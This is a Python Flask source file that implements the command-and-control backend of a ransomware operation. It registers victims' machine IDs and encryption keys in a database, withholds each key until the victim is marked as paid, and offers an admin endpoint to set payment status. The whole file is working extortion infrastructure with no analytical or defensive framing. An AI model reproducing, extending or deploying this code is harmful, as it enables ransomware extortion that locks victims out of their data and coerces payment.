from flask import Flask, request, jsonify
from flask_cors import CORS
import sqlite3, os

app = Flask(__name__)
CORS(app)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_NAME = os.path.join(BASE_DIR, "c2_database.db")

def get_db_connection():
    try:
        conn = sqlite3.connect(DB_NAME)
        conn.row_factory = sqlite3.Row 
        return conn
    except sqlite3.Error as e:
        print(f"[-] Database Connection Error: {e}")
        return None

def init_db():
    conn = get_db_connection()
    if not conn:
        return

    try:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                machine_id TEXT UNIQUE,
                encryption_key TEXT,
                payment_status TEXT DEFAULT 'pending',
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()
        print(f"[+] Database initialized at: {DB_NAME}")
    except sqlite3.Error as e:
        print(f"[-] Database Schema Error: {e}")
    finally:
        conn.close()


@app.route('/register', methods=['POST'])
def register_victim():
    """Endpoint for the client to send Machine_ID and Encryption Key."""
    data = request.get_json()
    
    if not data:
        return jsonify({"error": "Invalid or missing JSON payload"}), 400

    machine_id = data.get('machine_id')
    key = data.get('key')

    if not machine_id or not key:
        return jsonify({"error": "Missing machine_id or key"}), 400

    conn = get_db_connection()
    if not conn:
        return jsonify({"error": "Database connection failed"}), 500

    try:
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO victims (machine_id, encryption_key) VALUES (?, ?)",
            (machine_id, key)
        )
        conn.commit()
        print(f"[!] Registration: New Victim Registered -> {machine_id}")
        return jsonify({"status": "success", "message": "Data stored"}), 200
    except sqlite3.IntegrityError:
        return jsonify({"error": "Machine already registered"}), 400
    except Exception as e:
        print(f"[-] Registration Error: {str(e)}")
        return jsonify({"error": "Internal server error"}), 500
    finally:
        conn.close()

@app.route('/get_key', methods=['GET'])
def get_key():
    """Endpoint for the client to retrieve the key after payment verification."""
    machine_id = request.args.get('machine_id')

    if not machine_id:
        return jsonify({"error": "Missing machine_id parameter"}), 400

    conn = get_db_connection()
    if not conn:
        return jsonify({"error": "Database connection failed"}), 500

    try:
        cursor = conn.cursor()
        cursor.execute(
            "SELECT encryption_key, payment_status FROM victims WHERE machine_id = ?",
            (machine_id,)
        )
        result = cursor.fetchone()
        
        if result:
            key = result['encryption_key']
            status = result['payment_status']
            
            if status == 'paid':
                return jsonify({"key": key, "status": "success"}), 200
            else:
                return jsonify({"error": "Payment not verified", "status": status}), 403
        else:
            return jsonify({"error": "Machine ID not found"}), 404
    except Exception as e:
        print(f"[-] Retrieval Error: {str(e)}")
        return jsonify({"error": "Internal server error"}), 500
    finally:
        conn.close()

@app.route('/admin/set_paid', methods=['POST'])
def set_paid():
    """Admin endpoint to manually set a victim's status to 'paid'."""
    data = request.get_json()
    if not data:
        return jsonify({"error": "Invalid JSON"}), 400

    machine_id = data.get('machine_id')

    if not machine_id:
        return jsonify({"error": "Missing machine_id"}), 400

    conn = get_db_connection()
    if not conn:
        return jsonify({"error": "Database connection failed"}), 500

    try:
        cursor = conn.cursor()
        cursor.execute(
            "UPDATE victims SET payment_status = 'paid' WHERE machine_id = ?",
            (machine_id,)
        )
        if cursor.rowcount == 0:
            return jsonify({"error": "Machine ID not found"}), 404
            
        conn.commit()
        print(f"[+] Admin: Machine {machine_id} marked as PAID.")
        return jsonify({"status": "success", "message": f"Status updated for {machine_id}"}), 200
    except Exception as e:
        print(f"[-] Admin Error: {str(e)}")
        return jsonify({"error": "Internal server error"}), 500
    finally:
        conn.close()


if __name__ == '__main__':
    init_db()

    HOST = '127.0.0.1'
    PORT = 5000
    
    print(f"[*] C2 Server initializing...")
    print(f"[*] Local Address: http://{HOST}:{PORT}")
    print(f"[*] Waiting for connections...")

    app.run(host=HOST, port=PORT, debug=False, threaded=True)

